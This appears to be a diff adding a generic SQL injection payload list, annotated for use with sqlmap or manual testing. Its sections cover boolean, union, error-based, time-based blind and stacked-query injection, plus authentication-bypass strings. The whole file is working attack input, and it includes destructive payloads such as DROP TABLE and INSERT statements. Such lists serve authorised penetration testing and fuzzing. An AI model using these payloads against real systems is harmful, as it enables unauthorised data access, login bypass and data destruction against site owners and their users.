@@ -1,0 +1,78 @@
+# Generic SQL Injection Payloads
+# Use with sqlmap or manual testing
+
+# Basic payloads
+'
+"
+`
+')
+")
+`)
+'))
+"))
+
+# Boolean-based
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'/*
+" OR "1"="1
+" OR "1"="1"--
+" OR "1"="1"/*
+OR 1=1
+OR 1=1--
+OR 1=1#
+OR 1=1/*
+' OR 1=1--
+" OR 1=1--
+' OR 'x'='x
+' OR ''='
+" OR ""="
+
+# Union-based
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 1--
+' UNION SELECT 1,2--
+' UNION SELECT 1,2,3--
+" UNION SELECT NULL--
+" UNION SELECT NULL,NULL--
+
+# Error-based
+' AND 1=CONVERT(int,(SELECT @@version))--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--
+' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--
+' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+
+# Time-based blind
+' AND SLEEP(5)--
+" AND SLEEP(5)--
+' AND BENCHMARK(10000000,SHA1('test'))--
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+'; WAITFOR DELAY '0:0:5'--
+"); WAITFOR DELAY '0:0:5'--
+
+# Stacked queries
+'; SELECT 1--
+"; SELECT 1--
+'; DROP TABLE test--
+'; INSERT INTO users VALUES('hacked')--
+
+# Comment variations
+--
+#
+/*
+//
+/**/
+;--
+;#
+
+# Authentication bypass
+admin'--
+admin'#
+admin'/*
+' OR 1=1--
+' OR 1=1#
+') OR ('1'='1
+') OR ('1'='1'--
+admin')--
